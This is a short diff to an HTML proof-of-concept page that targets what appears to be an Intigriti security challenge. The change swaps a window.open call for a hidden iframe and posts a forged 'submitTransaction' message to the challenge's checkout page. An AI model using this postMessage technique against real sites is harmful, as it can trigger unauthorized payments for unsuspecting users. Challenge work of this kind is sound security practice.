@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <body>
+<iframe id="victim"
+  src="https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=1"
+  style="display:none"></iframe>
+
 <script>
-const target = "https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=1";
-
-const w = window.open(target, "_blank");
-
 setTimeout(() => {
-  w.postMessage({
+  document.getElementById("victim").contentWindow.postMessage({
     type: "submitTransaction",
     transaction: {
       currency: "BTC",
